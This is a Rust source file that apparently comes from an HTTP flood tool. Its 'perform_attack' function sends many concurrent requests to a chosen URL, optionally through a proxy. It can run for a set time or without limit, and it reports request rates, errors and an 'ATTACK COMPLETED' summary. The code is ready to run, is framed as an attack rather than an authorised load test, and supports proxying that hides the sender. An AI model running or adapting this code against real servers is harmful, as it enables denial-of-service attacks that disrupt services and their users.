use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use reqwest;
use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

pub async fn perform_attack(
    url: String, 
    duration: u64, 
    method: String, 
    headers: HashMap<String, String>, 
    data: Option<String>,
    proxy: Option<String>,
    concurrent: Option<u32>,
    delay: u64
) {
    // Shared counters for statistics
    let requests_sent = Arc::new(AtomicU64::new(0));
    let requests_success = Arc::new(AtomicU64::new(0));
    let requests_error = Arc::new(AtomicU64::new(0));
    let avg_response_time = Arc::new(Mutex::new(Vec::new()));
    let last_slow_warning = Arc::new(Mutex::new(Instant::now()));
    
    // Create a reqwest client builder
    let mut client_builder = reqwest::Client::builder()
        .timeout(Duration::from_secs(10));
    
    // Add proxy if provided
    if let Some(proxy_url) = proxy {
        if let Ok(p) = reqwest::Proxy::all(&proxy_url) {
            client_builder = client_builder.proxy(p);
        } else {
            eprintln!("{} Invalid proxy URL: {}", "ERROR".red(), proxy_url);
        }
    }
    
    // Build the client
    let client = client_builder.build().expect("Failed to create client");
    
    // Determine the number of concurrent requests
    let num_concurrent_requests = if let Some(concurrent_val) = concurrent {
        concurrent_val as usize
    } else {
        if duration == 0 { 100 } else { 20 }
    };
    
    // Create progress bar
    let pb = Arc::new(ProgressBar::new_spinner());
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner:.green} {msg}")
            .unwrap()
    );
    
    // Track start time for duration
    let start_time = Instant::now();
    
    // Create tasks for concurrent requests
    let mut tasks = Vec::new();
    
    for _ in 0..num_concurrent_requests {
        let client_clone = client.clone();
        let url_clone = url.clone();
        let method_clone = method.clone();
        let headers_clone = headers.clone();
        let data_clone = data.clone();
        let requests_sent_clone = requests_sent.clone();
        let requests_success_clone = requests_success.clone();
        let requests_error_clone = requests_error.clone();
        let avg_response_time_clone = avg_response_time.clone();
        let last_slow_warning_clone = last_slow_warning.clone();
        let delay_clone = delay;
        
        let task = tokio::spawn(async move {
            loop {
                // Check if duration is limited and exceeded
                if duration != 0 && start_time.elapsed().as_secs() >= duration {
                    break;
                }
                
                let request_start = Instant::now();
                
                // Build the request
                let mut request_builder = match method_clone.as_str() {
                    "GET" => client_clone.get(&url_clone),
                    "POST" => client_clone.post(&url_clone),
                    "PUT" => client_clone.put(&url_clone),
                    "DELETE" => client_clone.delete(&url_clone),
                    "PATCH" => client_clone.patch(&url_clone),
                    "HEAD" => client_clone.head(&url_clone),
                    _ => client_clone.get(&url_clone), // Default to GET
                };
                
                // Add headers
                for (key, value) in &headers_clone {
                    request_builder = request_builder.header(key, value);
                }
                
                // Add data if provided
                if let Some(ref payload) = data_clone {
                    request_builder = request_builder.body(payload.clone());
                }
                
                match request_builder.send().await {
                    Ok(_response) => {
                        let elapsed = request_start.elapsed().as_millis() as f64;
                        
                        requests_sent_clone.fetch_add(1, Ordering::SeqCst);
                        requests_success_clone.fetch_add(1, Ordering::SeqCst);
                        
                        // Record response time
                        {
                            let mut times = avg_response_time_clone.lock().unwrap();
                            times.push(elapsed);
                        }
                        
                        // Check if request was slow and warn if needed
                        if elapsed > 2000.0 { // More than 2 seconds
                            let mut last_warning = last_slow_warning_clone.lock().unwrap();
                            if last_warning.elapsed() > Duration::from_secs(5) {
                                println!("\n{} Slow request detected: {:.2}ms", "WARNING".yellow(), elapsed);
                                *last_warning = Instant::now();
                            }
                        }
                    }
                    Err(_) => {
                        requests_sent_clone.fetch_add(1, Ordering::SeqCst);
                        requests_error_clone.fetch_add(1, Ordering::SeqCst);
                    }
                }
                
                // Apply delay if specified
                if delay_clone > 0 {
                    tokio::time::sleep(Duration::from_millis(delay_clone)).await;
                }
                
                // Small delay to prevent overwhelming the system if unlimited
                if duration == 0 && delay_clone == 0 {
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
            }
        });
        
        tasks.push(task);
    }
    
    // Print status updates
    let pb_clone = pb.clone();
    let status_handle = tokio::spawn({
        let requests_sent_status = requests_sent.clone();
        let requests_success_status = requests_success.clone();
        let requests_error_status = requests_error.clone();
        let avg_response_time_status = avg_response_time.clone();
        
        async move {
            loop {
                tokio::time::sleep(Duration::from_secs(1)).await;
                
                let sent = requests_sent_status.load(Ordering::SeqCst);
                let success = requests_success_status.load(Ordering::SeqCst);
                let error = requests_error_status.load(Ordering::SeqCst);
                
                // Calculate average response time
                let avg_time = {
                    let times = avg_response_time_status.lock().unwrap();
                    if !times.is_empty() {
                        times.iter().sum::<f64>() / times.len() as f64
                    } else {
                        0.0
                    }
                };
                
                // Calculate requests per second
                let elapsed_time = start_time.elapsed().as_secs() as f64;
                let rps = if elapsed_time > 0.0 { sent as f64 / elapsed_time } else { 0.0 };
                
                // Display status
                pb_clone.set_message(format!(
                    "{} Sent: {}, Success: {}, Errors: {}, RPS: {:.1}, Avg: {:.2}ms",
                    "STATUS:".green(),
                    sent,
                    success,
                    error,
                    rps,
                    avg_time
                ));
                
                // Check for errors and warn if needed
                if error > 0 && sent > 0 {
                    let error_rate = (error as f64 / sent as f64) * 100.0;
                    if error_rate > 10.0 { // More than 10% errors
                        println!("\n{} High error rate detected: {:.2}% errors", "WARNING".yellow(), error_rate);
                    }
                }
                
                // Check for slow responses
                if avg_time > 1500.0 {
                    println!("\n{} Average response time is high: {:.2}ms", "WARNING".yellow(), avg_time);
                }
            }
        }
    });
    
    // Wait for duration if specified
    if duration > 0 {
        tokio::time::sleep(Duration::from_secs(duration)).await;
        
        // Cancel the status task
        status_handle.abort();
        
        // Wait a bit for tasks to finish
        for task in tasks {
            let _ = task.await;
        }
    } else {
        // If unlimited, keep running and handle Ctrl+C
        println!("\n{} Attack started in unlimited mode. Press Ctrl+C to stop.", "INFO".blue());
        
        // Wait indefinitely for tasks to finish (they won't unless interrupted)
        loop {
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
    
    // Stop the progress bar
    pb.finish_and_clear();
    
    // Print final statistics
    let total_sent = requests_sent.load(Ordering::SeqCst);
    let total_success = requests_success.load(Ordering::SeqCst);
    let total_error = requests_error.load(Ordering::SeqCst);
    
    println!("\n{}", "ATTACK COMPLETED".green().bold());
    println!("Total requests sent: {}", total_sent);
    println!("Successful requests: {}", total_success);
    println!("Failed requests: {}", total_error);
    
    if total_sent > 0 {
        let success_rate = (total_success as f64 / total_sent as f64) * 100.0;
        println!("Success rate: {:.2}%", success_rate);
        
        // Calculate requests per second
        let elapsed_time = start_time.elapsed().as_secs() as f64;
        let avg_rps = total_sent as f64 / elapsed_time;
        println!("Average requests per second: {:.1}", avg_rps);
    }
    
    // Calculate average response time
    let avg_time = {
        let times = avg_response_time.lock().unwrap();
        if !times.is_empty() {
            times.iter().sum::<f64>() / times.len() as f64
        } else {
            0.0
        }
    };
    
    if avg_time > 0.0 {
        println!("Average response time: {:.2}ms", avg_time);
    }
}